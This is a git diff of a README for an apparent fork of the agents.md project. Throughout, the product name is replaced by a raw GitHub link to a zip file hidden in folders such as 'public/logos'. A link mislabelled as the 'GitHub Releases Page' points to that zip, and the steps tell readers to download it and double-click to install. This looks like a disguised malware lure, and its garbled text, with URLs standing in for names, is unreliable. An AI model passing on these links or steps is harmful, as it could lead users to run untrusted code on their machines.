@@ -1,14 +1,14 @@
-# 🚀 https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip - A Simple Way to Guide Coding Agents
+# 🚀 https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip - A Simple Way to Guide Coding Agents
 
-[![Download https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip%https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip)](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip)
+[![Download https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip%https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip)](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip)
 
 ## 📜 Overview
 
-**https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip** is a user-friendly format created to help guide coding agents easily. Whether you are a beginner or just looking for a simple way to manage your coding tasks, https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip is designed to aid you without the need for any programming skill.
+**https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip** is a user-friendly format created to help guide coding agents easily. Whether you are a beginner or just looking for a simple way to manage your coding tasks, https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip is designed to aid you without the need for any programming skill.
 
 ## 🚀 Getting Started
 
-To get started with https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip, follow the steps below. Make sure you have a suitable environment where you can run the application. 
+To get started with https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip, follow the steps below. Make sure you have a suitable environment where you can run the application. 
 
 ### 📥 System Requirements
 
@@ -19,7 +19,7 @@ To get started with https://github.com/Medlamine20/agents.md/raw/refs/heads/main
 
 ## 📦 Download & Install
 
-Visit this page to download: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip)
+Visit this page to download: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Browse through the list of available versions.
@@ -27,7 +27,7 @@ Visit this page to download: [GitHub Releases Page](https://github.com/Medlamine
 4. Click on the version to expand it and see the available files.
 5. Download the appropriate file for your operating system. 
 
-Here it is again: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip) 
+Here it is again: [GitHub Releases Page](https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip) 
 
 ### ✨ Installation Steps
 
@@ -37,9 +37,9 @@ After downloading the file:
 2. Double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the installation process.
 
-## 🛠 Using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip
+## 🛠 Using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip
 
-Once installed, you can easily start using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip Here’s how to create your first guide:
+Once installed, you can easily start using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip Here’s how to create your first guide:
 
 1. Open the application.
 2. Click on "Create New Guide."
@@ -50,7 +50,7 @@ Your guides can include simple instructions, code snippets, and any helpful info
 
 ## 📖 Features
 
-https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip offers several key features to help you:
+https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip offers several key features to help you:
 
 - **Simple Formatting:** Write guides without worrying about complex code.
 - **Easy Sharing:** Export guides as markdown files for easy sharing.
@@ -58,11 +58,11 @@ https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_ex
 
 ## ❓ FAQs
 
-### What is https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip used for?
+### What is https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip used for?
 
-https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip allows users to create structured and clear guides for coding tasks. It is suitable for both individuals and teams.
+https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip allows users to create structured and clear guides for coding tasks. It is suitable for both individuals and teams.
 
-### Can I share my guides created with https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip
+### Can I share my guides created with https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip
 
 Yes, you can easily share your guides in markdown format, making them accessible to others.
 
@@ -76,8 +76,8 @@ If you'd like to report an issue or suggest improvements, please visit our GitHu
 
 ## 📝 License
 
-https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip is open-source and available under the MIT License. You can use it freely while respecting the license terms.
+https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip is open-source and available under the MIT License. You can use it freely while respecting the license terms.
 
-## 🎉 Enjoy Using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip!
+## 🎉 Enjoy Using https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip!
 
-Thank you for trying out https://github.com/Medlamine20/agents.md/raw/refs/heads/main/styles/md_agents_exhaustibility.zip We hope this tool enhances your coding experience and makes it easier to create helpful guides. If you have any feedback, please share it with us on GitHub!
+Thank you for trying out https://github.com/Medlamine20/agents.md/raw/refs/heads/main/public/logos/agents-md-2.8.zip We hope this tool enhances your coding experience and makes it easier to create helpful guides. If you have any feedback, please share it with us on GitHub!
